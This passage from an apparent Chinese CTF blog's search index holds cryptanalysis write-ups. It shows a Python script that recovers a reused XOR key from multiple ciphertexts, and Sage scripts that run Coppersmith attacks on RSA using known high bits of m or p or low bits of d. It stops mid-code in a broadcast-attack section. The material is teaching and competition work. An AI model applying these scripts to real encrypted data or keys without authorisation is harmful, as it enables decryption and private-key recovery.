string">'d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090'</span>c8<span class="token operator">=</span><span class="token string">'c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090'</span>c9<span class="token operator">=</span><span class="token string">'d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f'</span>c10<span class="token operator">=</span><span class="token string">'cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87'</span>c11<span class="token operator">=</span><span class="token string">'d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244'</span>ciphers <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4<span class="token punctuation">,</span> c5<span class="token punctuation">,</span> c6<span class="token punctuation">,</span> c7<span class="token punctuation">,</span> c8<span class="token punctuation">,</span> c9<span class="token punctuation">,</span> c10<span class="token punctuation">,</span> c11<span class="token punctuation">]</span><span class="token comment"># The target ciphertext we want to crack</span><span class="token comment"># XORs two string</span><span class="token keyword">def</span> <span class="token function">strxor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment"># xor two strings (trims the longer input)</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">target_fix</span><span class="token punctuation">(</span>target_cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">'-------begin-------'</span>    <span class="token comment"># To store the final key</span>    final_key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">150</span>    <span class="token comment"># To store the positions we know are broken</span>    known_key_positions <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># For each ciphertext</span>    <span class="token keyword">for</span> current_index<span class="token punctuation">,</span> ciphertext <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>        counter <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># for each other ciphertext</span>        <span class="token keyword">for</span> index<span class="token punctuation">,</span> ciphertext2 <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> current_index <span class="token operator">!=</span> index<span class="token punctuation">:</span> <span class="token comment"># don't xor a ciphertext with itself</span>                <span class="token keyword">for</span> indexOfChar<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ciphertext2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># Xor the two ciphertexts</span>                    <span class="token comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)</span>                    <span class="token keyword">if</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable <span class="token keyword">and</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> counter<span class="token punctuation">[</span>indexOfChar<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span> <span class="token comment"># Increment the counter at this index</span>        knownSpaceIndexes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># Loop through all positions where a space character was possible in the current_index cipher</span>        <span class="token keyword">for</span> ind<span class="token punctuation">,</span> val <span class="token keyword">in</span> counter<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span>            <span class="token keyword">if</span> val <span class="token operator">>=</span> <span class="token number">7</span><span class="token punctuation">:</span> knownSpaceIndexes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ind<span class="token punctuation">)</span>        <span class="token comment">#print knownSpaceIndexes # Shows all the positions where we now know the key!</span>        <span class="token comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span>        xor_with_spaces <span class="token operator">=</span> strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token operator">*</span><span class="token number">150</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> index <span class="token keyword">in</span> knownSpaceIndexes<span class="token punctuation">:</span>            <span class="token comment"># Store the key's value at the correct position</span>            final_key<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> xor_with_spaces<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>            <span class="token comment"># Record that we known the key at this position</span>            known_key_positions<span class="token punctuation">.</span>add<span class="token punctuation">(</span>index<span class="token punctuation">)</span>    <span class="token comment"># Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)</span>    final_key_hex <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>val <span class="token keyword">if</span> val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">'00'</span> <span class="token keyword">for</span> val <span class="token keyword">in</span> final_key<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># Xor the currently known key with the target cipher</span>    output <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>final_key_hex<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Fix this sentence:"</span>    <span class="token keyword">print</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>char <span class="token keyword">if</span> index <span class="token keyword">in</span> known_key_positions <span class="token keyword">else</span> <span class="token string">'*'</span> <span class="token keyword">for</span> index<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>    <span class="token comment"># WAIT.. MANUAL STEP HERE </span>    <span class="token comment"># This output are printing a * if that character is not known yet</span>    <span class="token comment"># fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a"</span>    <span class="token comment"># if is too hard, change the target_cipher to another one and try again</span>    <span class="token comment"># and we have our key to fix the entire text!</span>    <span class="token comment">#sys.exit(0) #comment and continue if u got a good key</span>    <span class="token keyword">print</span> <span class="token string">'------end------'</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>    target_fix<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">/</span><span class="token operator">**</span><span class="token operator">*</span> 复制并使用代码请注明引用出处哦<span class="token operator">~</span><span class="token operator">*</span> Lazzaro @ https<span class="token punctuation">:</span><span class="token operator">//</span>lazzzaro<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token operator">*</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Coppersmith攻击</title>
      <link href="/2023/01/15/Coppersmith%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/15/Coppersmith%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h3 id="相关网址"><a href="#相关网址" class="headerlink" title="相关网址"></a>相关网址</h3><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;blog.csdn.net&#x2F;q851579181q&#x2F;article&#x2F;details&#x2F;90645041<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;d8d2ce53041b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-已知m的高位"><a href="#1-已知m的高位" class="headerlink" title="1.已知m的高位"></a>1.已知m的高位</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">n<span class="token operator">=</span>0x2519834a6cc3bf25d078caefc5358e41c726a7a56270e425e21515d1b195b248b82f4189a0b621694586bb254e27010ee4376a849bb373e5e3f2eb622e3e7804d18ddb897463f3516b431e7fc65ec41c42edf736d5940c3139d1e374aed1fc3b70737125e1f540b541a9c671f4bf0ded798d727211116eb8b86cdd6a29aefcc7Le<span class="token operator">=</span><span class="token number">3</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x1f6f6a8e61f7b5ad8bef738f4376a96724192d8da1e3689dec7ce5d1df615e0910803317f9bafb6671ffe722e0292ce76cca399f2af1952dd31a61b37019da9cf27f82c3ecd4befc03c557efe1a5a29f9bb73c0239f62ed951955718ac0eaa3f60a4c415ef064ea33bbd61abe127c6fc808c0edb034c52c45bd20a219317fb75L<span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">=</span>0xb11ffc4ce423c77035280f1c575696327901daac8a83c057c453973ee5f4e508455648886441c0f3393fe4c922ef1c3a6249c12d21a000000000000000000L<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sage解密脚本"><a href="#sage解密脚本" class="headerlink" title="sage解密脚本"></a>sage解密脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">0x2519834a6cc3bf25d078caefc5358e41c726a7a56270e425e21515d1b195b248b82f4189a0b621694586bb254e27010ee4376a849bb373e5e3f2eb622e3e7804d18ddb897463f3516b431e7fc65ec41c42edf736d5940c3139d1e374aed1fc3b70737125e1f540b541a9c671f4bf0ded798d727211116eb8b86cdd6a29aefcc7</span>e <span class="token operator">=</span> <span class="token number">3</span>m <span class="token operator">=</span> randrange<span class="token punctuation">(</span>n<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>beta <span class="token operator">=</span> <span class="token number">1</span>epsilon <span class="token operator">=</span> beta<span class="token operator">^</span><span class="token number">2</span><span class="token operator">/</span><span class="token number">7</span>nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>kbits <span class="token operator">=</span> floor<span class="token punctuation">(</span>nbits<span class="token operator">*</span><span class="token punctuation">(</span>beta<span class="token operator">^</span><span class="token number">2</span><span class="token operator">/</span>e<span class="token operator">-</span>epsilon<span class="token punctuation">)</span><span class="token punctuation">)</span> mbar <span class="token operator">=</span> <span class="token number">0xb11ffc4ce423c77035280f1c575696327901daac8a83c057c453973ee5f4e508455648886441c0f3393fe4c922ef1c3a6249c12d21a000000000000000000</span>c <span class="token operator">=</span> <span class="token number">0x1f6f6a8e61f7b5ad8bef738f4376a96724192d8da1e3689dec7ce5d1df615e0910803317f9bafb6671ffe722e0292ce76cca399f2af1952dd31a61b37019da9cf27f82c3ecd4befc03c557efe1a5a29f9bb73c0239f62ed951955718ac0eaa3f60a4c415ef064ea33bbd61abe127c6fc808c0edb034c52c45bd20a219317fb75</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"upper %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>nbits<span class="token operator">-</span>kbits<span class="token punctuation">,</span> nbits<span class="token punctuation">)</span><span class="token punctuation">)</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token punctuation">(</span>mbar <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> cx0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># find root &lt; 2^kbits with factor = n1</span><span class="token keyword">print</span> <span class="token punctuation">(</span>mbar <span class="token operator">+</span> x0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-p高位攻击"><a href="#2-p高位攻击" class="headerlink" title="2.p高位攻击"></a>2.p高位攻击</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">n<span class="token operator">=</span>0x5894f869d1aecee379e2cb60ff7314d18dbd383e0c9f32e7f7b4dc8bd47535d4f3512ce6a23b0251049346fede745d116ba8d27bcc4d7c18cfbd86c7d065841788fcd600d5b3ac5f6bb1e111f265994e550369ddd86e20f615606bf21169636d153b6dfee4472b5a3cb111d0779d02d9861cc724d389eb2c07a71a7b3941da7dLe<span class="token operator">=</span><span class="token number">65537</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x284a601c3321fd882d3b64ae27fb587d1714bc18aecc3293169861bcf17678a6e83947aba4f165f22a712ed42e43c66cf70eb1df4d73dd3adf1754f627b1b3ca25b76b3a595369c36b1f5635cd3efe5924539757e74840224eec238534ead0bcbdce26eb018aa33516d22790240c7576cb5a09d3f69bcf2795a3a353db7c8bedL<span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">>></span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">=</span>0x5d33504b4e3bd2ffb628b5c447c4a7152a9f37dc4bcc8f376f64000fa96eb97c0af445e3b2c03926a4aa4542918c601000000000000000000000000000000000L<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sage解密脚本-1"><a href="#sage解密脚本-1" class="headerlink" title="sage解密脚本"></a>sage解密脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> 0x5894f869d1aecee379e2cb60ff7314d18dbd383e0c9f32e7f7b4dc8bd47535d4f3512ce6a23b0251049346fede745d116ba8d27bcc4d7c18cfbd86c7d065841788fcd600d5b3ac5f6bb1e111f265994e550369ddd86e20f615606bf21169636d153b6dfee4472b5a3cb111d0779d02d9861cc724d389eb2c07a71a7b3941da7dLp_fake <span class="token operator">=</span> <span class="token number">0x5d33504b4e3bd2ffb628b5c447c4a7152a9f37dc4bcc8f376f64000fa96eb97c0af445e3b2c03926a4aa4542918c601000000000000000000000000000000000</span>pbits <span class="token operator">=</span> p_fake<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>kbits <span class="token operator">=</span> <span class="token number">128</span>  <span class="token comment">#p失去的低位</span>pbar <span class="token operator">=</span> p_fake <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>pbits<span class="token operator">-</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"upper %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pbits<span class="token operator">-</span>kbits<span class="token punctuation">,</span> pbits<span class="token punctuation">)</span><span class="token punctuation">)</span> PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> x <span class="token operator">+</span> pbarx0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># find root &lt; 2^kbits with factor >= n^0.3</span><span class="token keyword">print</span> <span class="token punctuation">(</span>x0 <span class="token operator">+</span> pbar<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、已知私钥d的512位的低位"><a href="#3、已知私钥d的512位的低位" class="headerlink" title="3、已知私钥d的512位的低位"></a>3、已知私钥d的512位的低位</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">n<span class="token operator">=</span>0xd463feb999c9292e25acd7f98d49a13413df2c4e74820136e739281bb394a73f2d1e6b53066932f50a73310360e5a5c622507d8662dadaef860b3266222129fd645eb74a0207af9bd79a9794f4bd21f32841ce9e1700b0b049cfadb760993fcfc7c65eca63904aa197df306cad8720b1b228484629cf967d808c13f6caef94a9Le<span class="token operator">=</span><span class="token number">3</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xcaeeb38516d642a19550fa863173f4695c3b44bd5a5554b1e93cfb690d5c1de531b7f1187f7d8c8c11da38af025f19d393033d0ca801e15d6d8441098485f13ab988d09ef1f4f5a735e19780c823cf77415884c33a1f7908cf4229874c082eb7ceb776bafb182b86fdabd29b07bcb8e3f2f50ee4cc0f323e8d9ce320139bcd27Ld<span class="token operator">=</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>d<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span>0x603d033f2ef6c759aec839f132a45215fc8a635b757f3951a731fe60bc6729b3bcf819b57abfcaba3a93e9edef766c0d499cad3f7adb306bcf1645cfb63400e3Llong_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>???<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sage解密脚本-2"><a href="#sage解密脚本-2" class="headerlink" title="sage解密脚本"></a>sage解密脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">partial_p</span><span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x <span class="token operator">+</span> p0    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token punctuation">(</span>nbits<span class="token operator">//</span><span class="token number">2</span><span class="token operator">-</span>kbits<span class="token punctuation">)</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span>  <span class="token comment"># find root &lt; 2^(nbits//2-kbits) with factor >= n^0.3</span>    <span class="token keyword">if</span> roots<span class="token punctuation">:</span>        x0 <span class="token operator">=</span> roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x0 <span class="token operator">+</span> p0<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">return</span> ZZ<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">find_p</span><span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    X <span class="token operator">=</span> var<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        results <span class="token operator">=</span> solve_mod<span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token operator">*</span>d0<span class="token operator">*</span>X <span class="token operator">-</span> k<span class="token operator">*</span>X<span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span>X<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token operator">*</span>n <span class="token operator">==</span> X<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> results<span class="token punctuation">:</span>            p0 <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> partial_p<span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            <span class="token keyword">if</span> p<span class="token punctuation">:</span>                <span class="token keyword">return</span> p<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token number">0xd463feb999c9292e25acd7f98d49a13413df2c4e74820136e739281bb394a73f2d1e6b53066932f50a73310360e5a5c622507d8662dadaef860b3266222129fd645eb74a0207af9bd79a9794f4bd21f32841ce9e1700b0b049cfadb760993fcfc7c65eca63904aa197df306cad8720b1b228484629cf967d808c13f6caef94a9</span>    e <span class="token operator">=</span> <span class="token number">3</span>    d <span class="token operator">=</span> <span class="token number">0x603d033f2ef6c759aec839f132a45215fc8a635b757f3951a731fe60bc6729b3bcf819b57abfcaba3a93e9edef766c0d499cad3f7adb306bcf1645cfb63400e3</span>    beta <span class="token operator">=</span> <span class="token number">0.5</span>    epsilon <span class="token operator">=</span> beta<span class="token operator">^</span><span class="token number">2</span><span class="token operator">/</span><span class="token number">7</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"nbits:%d:"</span><span class="token operator">%</span><span class="token punctuation">(</span>nbits<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#kbits = floor(nbits*(beta^2+epsilon))</span>    kbits <span class="token operator">=</span> nbits <span class="token operator">-</span> d<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"kbits:%d"</span><span class="token operator">%</span><span class="token punctuation">(</span>kbits<span class="token punctuation">)</span><span class="token punctuation">)</span>    d0 <span class="token operator">=</span> d <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"lower %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>kbits<span class="token punctuation">,</span> nbits<span class="token punctuation">)</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> find_p<span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"found p: %d"</span> <span class="token operator">%</span> p<span class="token punctuation">)</span>    q <span class="token operator">=</span> n<span class="token operator">//</span>p    <span class="token keyword">print</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>inverse_mod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、-低加密指数广播攻击"><a href="#4、-低加密指数广播攻击" class="headerlink" title="4、 低加密指数广播攻击"></a>4、 低加密指数广播攻击</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">e<span class="token operator">=</span><span class="token number">3</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token 